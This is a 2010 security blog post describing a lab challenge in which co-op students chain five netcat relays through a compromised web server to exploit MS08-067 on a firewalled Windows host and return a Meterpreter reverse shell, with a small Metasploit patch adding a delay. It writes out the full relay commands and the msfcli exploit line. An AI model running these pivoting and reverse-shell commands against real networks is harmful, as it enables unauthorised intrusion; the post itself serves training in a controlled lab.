---
id: 793
title: 'Five Relays and a Patch'
date: '2010-05-26T08:57:34-05:00'
author: ron
layout: post
guid: 'http://www.skullsecurity.org/blog/?p=793'
permalink: /2010/five-relays-and-a-patch
categories:
    - Hacking
    - Tools
---

Hey all,

We hired a new pair of <a href="http://coop.cs.umanitoba.ca">co-op students</a> recently. They're both in their last academic terms, and are looking for a good challenge and to learn a lot. So, for a challenge, I set up a scenario that forced them to use a series of netcat relays to compromise a target host and bring a meterpreter session back. Here is what the network looked like:
<img style="border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px; border-style: initial; border-color: initial; display: block; margin-left: auto; margin-right: auto; " title="Firewall Rules" src="http://www.skullsecurity.org/blogdata/fiverelays-1.png" alt="" width="236" height="494" />
To describe in text:
<ul>
	<li>They have already compromised a Web server with a non-root account</li>
	<li>The Web server has no egress filtering, but full ingress filtering, and they aren’t allowed to install anything (fortunately, it already had Netcat)</li>
	<li>The target server has both egress and ingress filtering, and is not accessible at all from the Internet, but the Web server can connect to it on 139/445 (which are vulnerable to ms08-067). The target can also connect back to the Web server on any port.</li>
</ul>
The challenge was to exploit the target server with ms08-067 and bring a meterpreter session back to the attacker server.
<!--more-->
I had expected this would require 3-4 netcat relays, but, after helping them to get this working, we ended up with 5 relays for a variety of reasons, plus a minor patch to Metasploit! Maybe we did it the hard way, and maybe we didn’t need all those relays, but it was fun to set up and satisfying to get working.

Anyway, I’ll let them explain what they did!
<h2>Five relays and a patch</h2>
The image below shows the various netcat relays we ended up using, in order of execution.

<img style="border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px; border-style: initial; border-color: initial; display: block; margin-left: auto; margin-right: auto; " title="Relays" src="/blogdata/fiverelays-2.png" alt="" width="405" height="560" />

The first goal was to find a way to bypass the firewalls.  Metasploit was using default ports 445 for outgoing and 4444 for incoming connections, and since we can't connect to either of those ports on the Web Server (WEB), we needed the WEB to establish a connection back to us.  Fortunately WEB can connect to TARGET on port 445, and can receive a connection back on any port. Thus 2 netcats are running on the WEB are:
<pre> nc HACKER 1234 -vv &lt; pipe4 |  nc TARGET 445 -vv &gt; pipe4</pre>
This command forwards the traffic coming in on port 1234 from the HACKER to TARGET port 445 (Relay #4).
<pre> nc -l -p 4444 -vv &lt; pipe2 | nc HACKER 4442 -vv &gt; pipe2</pre>
This command listens for the meterpreter session back from TARGET on port 4444 and relays it to HACKER on port 4442 (Relay #2).

Why does WEB connect on arbitrary port 1234 instead of connecting to Metasploit's port 445? Well, Metasploit doesn't listen on that port, it needs to initiate the connection. So we need a netcat relay running on HACKER to listen for connection from Metasploit and connect it with the incoming connection from the WEB (Relay #3):
<pre>nc -l -p 1234 -vv &lt; pipe3 | nc -l -p 445 &gt; pipe3</pre>
As you might have noticed the WEB is  connecting back on port 4442, not 4444 on which Metasploit is listening (Relay #2). They cannot be connected directly, as WEB will establish connection immediately when it starts and Metasploit will get confused since its waiting on Meterpreter session and fail. So we need a relay listening on port 4442 on the HACKER and connecting it back to Metasploit, right? Well, not that simple.
<pre> nc -l -p 4443 -vv &lt; pipe1 | nc -l -p 4442 -vv &gt; pipe1</pre>
This command will listen for incoming connection from WEB on port 4442 and relay it to port 4443 when that connection is established (Relay #1). This gives Metasploit time to trigger an exploit and we only establish a final connection to Metasploit  once it did by running a final command:
<pre>nc HACKER 4444 -vv &lt; pipe5 | nc HACKER 4443 -vv &gt; pipe</pre>
This simply establishes a connection to the relay running on the same computer on port 4443 and sends it to Metasploit on port 4444 (Relay #6).

The biggest challenge was getting the timing of the last command right. We needed to activate it after Metasploit starts listening for the reverse_tcp stager but before it sends stage data. If stage data was sent before the entire link was created,the vulnerability would be exploited, but the stage would fail. In order to get the timing right for the final command, a modification to the <em>stager.rb</em> in the <em>lib/msf/core/payload/</em> folder was necessary. We added a three-second delay after the vulnerability has been triggered and before the stage data was sent in order to give us time to link the netcat relays together for the connection back.

This is the patch against the Metaploit version on the Backtrack 4 cd (it'll likely fail against the HEAD revision due to a number of changes):
<pre>Index: stager.rb
===================================================================
--- stager.rb   (revision 8091)
+++ stager.rb   (working copy)
@@ -100,6 +100,9 @@
                                p = (self.stage_prefix || '') + p
                        end

+            print_status("Delaying for three seconds (Start your nc relay).")
+            Kernel.sleep(3)
+
                        print_status("Sending stage (#{p.length} bytes)")

                        # Send the stage
@@ -164,4 +167,5 @@
        #
        attr_accessor :stage_prefix</pre>
Now that everything should be (theoretically) working, we had to make sure to start netcat relays in the right order to make sure they can establish connections, and we had to wait before executing #6 until #2 received a connection established message. The -vv command is optional for all nc instances except in #2, where they are used to determine when to execute #6. We first start all the listener relays and then start the relays that establish connections. The commands were executed in the order provided
<ol>
	<li>This command is run on the HACKER:</li>
<pre>nc -l -p 4443 -vv &lt; pipe1 | nc -l -p 4442 -vv &gt; pipe1</pre>
	<li>This command was run on the WEB:</li>
<pre>nc -l -p 4444 -vv &lt; pipe2 | nc HACKER 4442 -vv &gt; pipe2</pre>
	<li>HACKER:</li>
<pre>nc -l -p 1234 -vv &lt; pipe3 | nc -l -p 445 &gt; pipe3</pre>
	<li>WEB:</li>
<pre>nc HACKER 1234 -vv &lt; pipe4 | nc TARGET 445 -vv &gt; pipe4</pre>
	<li>Now that we have a connection to the target we run an exploit:</li>
<pre>./msfcli exploit/windows/smb/ms08_067_netapi 
 PAYLOAD=windows/meterpreter/reverse_tcp RHOST=HACKER LHOST=WEB E</pre>
	<li>Last command is run on HACKER when Relay #2 displays a detected connection:</li>
<pre>nc HACKER 4444 -vv &lt; pipe5 | nc HACKER 4443 -vv &gt; pipe</pre>
</ol>